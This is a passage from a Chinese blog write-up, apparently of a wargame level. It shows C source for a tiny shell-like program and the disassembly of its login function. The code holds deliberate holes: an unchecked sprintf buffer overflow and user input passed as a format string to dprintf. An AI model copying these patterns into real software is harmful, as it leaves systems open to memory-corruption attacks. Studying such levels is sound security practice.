  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;asprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;--&amp;gt; [%s] is unsupported at this current time.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;free&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;setuser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;unable to set user to &amp;#39;%s&amp;#39; -- not supported.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;d:v&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;switch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;optarg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;w+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to open %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;optarg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;setvbuf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_IONBF&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;v&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Starting up. Verbose level = %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

  &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strchr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strchr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;dvprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;got [%s] as input&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;dvprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;attempting to login&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;logout&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;dvprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;attempting to start shell&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;unable to execve&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Permission denied&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;logout&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;closelog&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;site exec&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;notsupported&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;setuser&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;setuser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看到这段长长的C代码就感到心累啊，其实这段代码的框架是标准的Linux命令行程序，模拟了一个小小的shell。&lt;/p&gt;
&lt;p&gt;解释一下程序大的框架：直接看main函数，程序启动后通过&lt;code&gt;getopt()&lt;/code&gt;解析参数，含参参数d和不含参参数v，d参数后面跟着的参数为文件路径，而v则让全局结构体中verbose变量自增。之后进入无限循环，从标准输入中获取输入（要求\r\n结尾），对于输入执行相关函数或操作。之后看宏定义：两个宏用于调试输出，而全局结构体中的verbose就是指定调试等级的，所有调试内容会输出到刚才d参数后的参数指定的路径中。&lt;/p&gt;
&lt;p&gt;反汇编程序后找到一个突破口在login函数中：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x08048c50 &amp;lt;+0&amp;gt;:    sub    $0x6c,%esp
0x08048c53 &amp;lt;+3&amp;gt;:    mov    %ebx,0x60(%esp)
0x08048c57 &amp;lt;+7&amp;gt;:    mov    %edi,0x68(%esp)
0x08048c5b &amp;lt;+11&amp;gt;:   mov    0x70(%esp),%edi
0x08048c5f &amp;lt;+15&amp;gt;:   mov    %gs:0x14,%eax
0x08048c65 &amp;lt;+21&amp;gt;:   mov    %eax,0x5c(%esp)
0x08048c69 &amp;lt;+25&amp;gt;:   xor    %eax,%eax
0x08048c6b &amp;lt;+27&amp;gt;:   mov    %esi,0x64(%esp)
0x08048c6f &amp;lt;+31&amp;gt;:   movl   $0x8048fba,0x4(%esp)
0x08048c77 &amp;lt;+39&amp;gt;:   movl   $0x8048ef0,(%esp)
0x08048c7e &amp;lt;+46&amp;gt;:   call   0x8048750 &amp;lt;fopen@plt&amp;gt;
0x08048c83 &amp;lt;+51&amp;gt;:   test   %eax,%eax
0x08048c85 &amp;lt;+53&amp;gt;:   mov    %eax,%ebx
0x08048c87 &amp;lt;+55&amp;gt;:   je     0x8048cb5 &amp;lt;login+101&amp;gt;
0x08048c89 &amp;lt;+57&amp;gt;:   lea    0x1c(%esp),%esi
0x08048c8d &amp;lt;+61&amp;gt;:   mov    %eax,0x8(%esp)
0x08048c91 &amp;lt;+65&amp;gt;:   movl   $0x3f,0x4(%esp)
0x08048c99 &amp;lt;+73&amp;gt;:   mov    %esi,(%esp)
0x08048c9c &amp;lt;+76&amp;gt;:   call   0x8048670 &amp;lt;fgets@plt&amp;gt;
0x08048ca1 &amp;lt;+81&amp;gt;:   test   %eax,%eax
0x08048ca3 &amp;lt;+83&amp;gt;:   je     0x8048d18 &amp;lt;login+200&amp;gt;
0x08048ca5 &amp;lt;+85&amp;gt;:   mov    %esi,0x4(%esp)
0x08048ca9 &amp;lt;+89&amp;gt;:   mov    %edi,(%esp)
0x08048cac &amp;lt;+92&amp;gt;:   call   0x8048640 &amp;lt;strcmp@plt&amp;gt;
0x08048cb1 &amp;lt;+97&amp;gt;:   test   %eax,%eax
0x08048cb3 &amp;lt;+99&amp;gt;:   jne    0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048cb5 &amp;lt;+101&amp;gt;:  mov    0x804b0ac,%edx
0x08048cbb &amp;lt;+107&amp;gt;:  test   %edx,%edx
0x08048cbd &amp;lt;+109&amp;gt;:  je     0x8048cea &amp;lt;login+154&amp;gt;
0x08048cbf &amp;lt;+111&amp;gt;:  mov    $0x8048f50,%eax
0x08048cc4 &amp;lt;+116&amp;gt;:  test   %ebx,%ebx
0x08048cc6 &amp;lt;+118&amp;gt;:  mov    $0x8048fa0,%ecx
0x08048ccb &amp;lt;+123&amp;gt;:  cmovne %ecx,%eax
0x08048cce &amp;lt;+126&amp;gt;:  mov    %eax,0xc(%esp)
0x08048cd2 &amp;lt;+130&amp;gt;:  movl   $0x8048fe0,0x8(%esp)
0x08048cda &amp;lt;+138&amp;gt;:  movl   $0x1,0x4(%esp)
0x08048ce2 &amp;lt;+146&amp;gt;:  mov    %edx,(%esp)
0x08048ce5 &amp;lt;+149&amp;gt;:  call   0x8048770 &amp;lt;__fprintf_chk@plt&amp;gt;
0x08048cea &amp;lt;+154&amp;gt;:  movl   $0x1,0x804b0b4
0x08048cf4 &amp;lt;+164&amp;gt;:  mov    0x5c(%esp),%eax
0x08048cf8 &amp;lt;+168&amp;gt;:  xor    %gs:0x14,%eax
0x08048cff &amp;lt;+175&amp;gt;:  jne    0x8048d43 &amp;lt;login+243&amp;gt;
0x08048d01 &amp;lt;+177&amp;gt;:  mov    0x60(%esp),%ebx
0x08048d05 &amp;lt;+181&amp;gt;:  mov    0x64(%esp),%esi
0x08048d09 &amp;lt;+185&amp;gt;:  mov    0x68(%esp),%edi
0x08048d0d &amp;lt;+189&amp;gt;:  add    $0x6c,%esp
0x08048d10 &amp;lt;+192&amp;gt;:  ret    
0x08048d11 &amp;lt;+193&amp;gt;:  lea    0x0(%esi,%eiz,1),%esi
0x08048d18 &amp;lt;+200&amp;gt;:  mov    0x804b0ac,%eax
0x08048d1d &amp;lt;+205&amp;gt;:  test   %eax,%eax
0x08048d1f &amp;lt;+207&amp;gt;:  je     0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048d21 &amp;lt;+209&amp;gt;:  movl   $0x8048ef0,0xc(%esp)
0x08048d29 &amp;lt;+217&amp;gt;:  movl   $0x8048fbc,0x8(%esp)
0x08048d31 &amp;lt;+225&amp;gt;:  movl   $0x1,0x4(%esp)
0x08048d39 &amp;lt;+233&amp;gt;:  mov    %eax,(%esp)
0x08048d3c &amp;lt;+236&amp;gt;:  call   0x8048770 &amp;lt;__fprintf_chk@plt&amp;gt;
0x08048d41 &amp;lt;+241&amp;gt;:  jmp    0x8048cf4 &amp;lt;login+164&amp;gt;
